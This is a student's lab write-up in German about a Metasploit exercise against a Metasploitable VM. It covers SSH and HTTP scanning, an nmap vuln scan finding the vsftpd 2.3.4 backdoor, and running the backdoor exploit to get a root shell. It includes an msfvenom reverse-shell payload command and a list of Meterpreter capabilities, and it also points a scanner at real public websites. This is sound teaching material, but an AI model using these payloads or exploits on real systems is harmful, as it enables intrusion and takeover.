Petra Bernroitner, 4AHITS, 19.01.2026

# very safe FTP backdoor

Metasploit ist ein Werkzeugkasten für Hacker und Penetration-Tester: damit kann man Schwachstellen suchen, Exploits ausprobieren, payloads (shell-code) bauen und nach einem erfolgreichen Einbruch weiterforschen (Meterpreter).

Gemeinsame Übung (Metasploit)
```msfconsole```

1. IP von Metasploitable herausfinden (192.168.168.132)


Beispiel: Die Module SSH Version und http Title.

### SSH Version:
```bash
search -h
search ssh
search scanner/ssh
search type:auxiliary name:ssh
info auxiliary/scanner/ssh/ssh_version
use auxiliary/scanner/ssh/ssh_version
options
set RHOSTS <target IP>
run
```

### http Title:
```bash
use auxiliary/scanner/http/title
info
options
set RHOSTS <target IP>
run
set RHOSTS www.orf.at
run
set RHOSTS www.htl-braunau.at
run
```






## Übung (msf Basics)
Probiere alle besprochenen bzw. open beschriebenen msf Befehle noch einmal aus und erstelle ein kurzes Cheatsheet zur Bedienung von metasploit.

- **search -h:**
  
<img width="865" height="370" alt="image" src="https://github.com/user-attachments/assets/c2e28021-237c-465d-a4ea-499e99fb174a" />

- **info:**
liefert eine Beschreibung

- **options:**
man sieht viele Module und dessen Settings.

-> RHOST ist "required", also wird benötigt, so gehört eine Ip Adresse zugewiesen

RHOST ist "required", also wird benötigt, so gehört eine Ip Adresse zugewiesen

das geht mit ```set RHOSTS 192.168.168.132```


- **run:**
führt aus und man kann die ssh Version rauslesen:

<img width="1137" height="268" alt="image" src="https://github.com/user-attachments/assets/9bb6beda-e0ab-402e-802e-b1068862c4fe" />

*192.168.168.132 - SSH server version: SSH-2.0-OpenSSH_4.7p1 Debian-8ubuntu1*


### Metasploit Cheatsheet – Befehle & Optionen
```bash
| Befehl / Kürzel | Schreibweise / Beispiel | Erklärung (Kurz) |
|-----------------|-------------------------|------------------|
| msfconsole | msfconsole | Startet die Metasploit-Konsole |
| search <term> | search ssh | Sucht nach Modulen mit dem angegebenen Begriff |
| search -h | search -h | Zeigt Hilfe und Suchoptionen |
| search scanner/ssh | search scanner/ssh | Sucht gezielt nach SSH-Scanner-Modulen |
| search type:auxiliary name:ssh | search type:auxiliary name:ssh | Sucht Auxiliary-Module mit „ssh“ im Namen |
| use <modul> | use auxiliary/scanner/ssh/ssh_version | Wählt ein Modul aus |
| info | info | Zeigt Informationen zum aktuellen Modul |
| info <modul> | info auxiliary/scanner/ssh/ssh_version | Zeigt Infos zu einem bestimmten Modul |
| options | options | Zeigt benötigte und optionale Parameter |
| set RHOSTS <ziel> | set RHOSTS 192.168.11.51 | Setzt Ziel-IP oder Domain |
| set RHOSTS <domain> | set RHOSTS www.orf.at | Setzt eine Domain als Ziel |
| run | run | Führt das ausgewählte Modul aus |
| auxiliary/scanner/ssh/ssh_version | use auxiliary/scanner/ssh/ssh_version | Ermittelt die SSH-Version des Ziels |
| auxiliary/scanner/http/title | use auxiliary/scanner/http/title | Liest den Titel (<title>) einer Webseite aus |
| back | back | Verlässt das aktuelle Modul |
| exit | exit | Beendet Metasploit |
```

**Typischer Workflow**
*search → use → options → set RHOSTS → run*


Der Befehl setg (set global) ist in unserem Zusammenhang auch sehr praktisch, recherchiere dazu.
Recherchiere zu

- **msfvenom:**

msfvenom ist ein Tool von Metasploit zum Erstellen von Payloads.

- Erstellt schädliche Nutzlasten (Payloads)
- Kombiniert Payload + Encoder + Format in einer Datei
- Wird oft für Exploits oder Penetrationstests verwendet

 Typische Einsätze:
- Reverse Shell erzeugen
- Payloads für Windows, Linux, Android, PHP, etc.

Beispiel:
```msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.10 LPORT=4444 -f exe > shell.exe```

msfvenom = Payload-Generator


- **Meterpreter:**

Meterpreter ist ein erweiterter Payload (Shell), der über Metasploit läuft.

- Gibt dir Kontrolle über das Zielsystem
- Läuft im Speicher (schwerer zu erkennen)
- Ermöglicht viele Aktionen ohne neue Verbindungen

Mögliche Funktionen:
- Dateien hoch-/runterladen
- Screenshots machen
- Prozesse anzeigen
- Rechte eskalieren
- Webcam / Mikrofon nutzen (wenn möglich)

Beispiel-Befehle in Meterpreter:
```bash
sysinfo        → Systeminformationen
ls             → Dateien anzeigen
download file  → Datei herunterladen
upload file    → Datei hochladen
```

Meterpreter = mächtige interaktive Shell

```bash
msfvenom → erstellt Payloads
Meterpreter → steuert das kompromittierte System
```

## Übung (nmap FTP scan)
Aufgabe: Wiederhole den nmap vuln scan auf den FTP Port. Verwende:

- **Option --script=vuln** (Diese Skripte sind “intrusive” und werden daher nicht über die Optionen -sC oder -A aufgerufen.)
  
```nmap --script=vuln 192.168.168.132```

<img width="638" height="244" alt="image" src="https://github.com/user-attachments/assets/5bc4f12f-643a-424a-b965-da40edfc1996" />
<img width="614" height="51" alt="image" src="https://github.com/user-attachments/assets/804687a6-2026-44f7-ba90-9bc114857243" />



- **Option -p** zum Einschränken auf den FTP Port

  ```nmap -p 192.168.168.132```

  <img width="909" height="83" alt="image" src="https://github.com/user-attachments/assets/8d8d78ce-1efd-4d6d-b8fb-6b738b02b86d" />


**Findet nmap die Sicherheitslücke? Recherchiere mit Hilfe der CVE Nummer über diese Sicherheitslücke.**


*Ja, Nmap findet beim Vuln-Scan auf dem FTP-Port eine Sicherheitslücke.*

Beim Scan mit 
```nmap --script=vuln -p 21 192.168.168.132```
 wird eine bekannte FTP-Schwachstelle erkannt.

**CVE-2011-2523 (vsftpd 2.3.4 Backdoor)**

Betroffene Software:
- vsftpd Version 2.3.4

In der manipulierten Version von vsftpd 2.3.4 wurde eine Backdoor eingebaut.

Wenn sich ein Benutzer mit einem Benutzernamen anmeldet, der ein :) enthält, öffnet der FTP-Server eine Root-Shell auf Port 6200.

Auswirkungen:
- Remote Code Execution
- Angreifer erhalten vollen Systemzugriff (Root)


**Recherchiere warum diese Skripte als intrusive bezeichnet werden, warum werden diese bei -sC oder -A nicht ausgeführt?**


Intrusive Skripte greifen aktiv in das Zielsystem ein.

- Sie senden gezielte Exploit-ähnliche Anfragen
- Sie testen Schwachstellen nicht nur passiv, sondern provozieren Verhalten
- können Dienste abstürzen lassen
- können Logs erzeugen
- können Systeme beeinflussen oder verändern

Deshalb sind sie nicht nur reine Informationsabfragen.

Warum werden diese Skripte nicht bei -sC oder -A ausgeführt?
```-sC``` (Default Scripts)

- Führt nur sichere, nicht-intrusive Skripte aus
- Keine Exploit-Versuche
- Keine Gefahr für Produktivsysteme

```-A```(Aggressiver Scan)

- Enthält zwar viele Scans (OS, Versionen, Traceroute)
- keine gefährlichen Vuln-Skripte

-> Informationsgewinn, nicht Angriff

Intrusive Skripte müssen bewusst und explizit mit --script=vuln gestartet werden, um unbeabsichtigte Schäden zu vermeiden.

Kurzfazit
- Nmap findet eine FTP-Sicherheitslücke
- CVE-2011-2523 erlaubt vollständigen Systemzugriff
- Vuln-Skripte sind „intrusive“, da sie aktiv Schwachstellen testen
- Deshalb werden sie nicht automatisch bei -sC oder -A ausgeführt

## Übung (msf FTP Version herausfinden)
In dieser Übung findest du mit Hilfe eines msf Moduls ähnliche Informationen wie mit dem vorherigen nmap scan.

Suche nach einem msf Modul mit dem die Version des FTP Servers ermittelt werden kann, du findest dies in der Kategorie scanner .

Verwende dieses Modul um die auf Metasploitable installierte FTP Version herauszufinden.

```bash
msfconsole
search ftp scanner
use auxiliary/scanner/ftp/ftp_version
options
set RHOSTS 192.168.168.132
run
```
search:

<img width="1115" height="614" alt="image" src="https://github.com/user-attachments/assets/89f0b56e-f796-4c5e-a57e-8908cf1564a0" />

run:

<img width="570" height="66" alt="image" src="https://github.com/user-attachments/assets/3c7be94a-09de-4a72-a921-1d448093dbca" />

=> FTP Banner: vsFTPd 2.3.4


## Übung (msf vsftpd exploit)
Voraussetzung: Setze Kali und Metasploitable in den **NAT Modus**.

1. Starte metasploit aus dem Terminal mit msfconsole (metasploit framework console)
   - help zeigt einen Hilfetext an.

2. Verwende search um ein metasploit Modul zu finden dass einen exploit für diese Backdoor zur Verfügung stellt. Hinweis: Suche nach vsftpd

```search vsftpd``` 

<img width="989" height="201" alt="image" src="https://github.com/user-attachments/assets/03853768-bb82-4169-887e-aa66050d893e" />

3. Aktiviere dieses Modul mit use.

   ```use xploit/unix/ftp/vsftpd_234_backdoor```


Die Anzeige sollte nun so aussehen:

[*] No payload configured, defaulting to cmd/unix/interact
msf6 exploit(unix/ftp/...) > 

<img width="964" height="246" alt="image" src="https://github.com/user-attachments/assets/f499b185-3ab3-41a1-916b-9c694fce63e6" />


4. Verwende info um Informationen zum aktivierten Modul anzuzeigen. Lies die “Description” durch und finde heraus welche Optionen dieses Modul unterstützt und wie diese gesetzt werden müssen. Setze die notwendigen Optionen.

<img width="1100" height="715" alt="image" src="https://github.com/user-attachments/assets/b08519df-313d-4d2a-9e2b-d1966083e32a" />

=> Description:

  This module exploits a malicious backdoor that was added to the       VSFTPD download
  archive. This backdoor was introduced into the vsftpd-2.3.4.tar.gz archive between
  June 30th 2011 and July 1st 2011 according to the most recent information
  available. This backdoor was removed on July 3rd 2011.


5. Verwende den Befehl run um das aktive Modul auszuführen. Es startet eine shell. Verifiziere, dass diese am Metasploit System läuft. Welche Rechte hat diese shell (welcher user)?

<img width="930" height="185" alt="image" src="https://github.com/user-attachments/assets/cb66b8fc-4c62-4022-9f2d-7c647ecc47ca" />


Hinterlasse eine Nachricht you have been hacked!die beim nächsten Einloggen dem User msfadmin automatisch angezeigt wird.




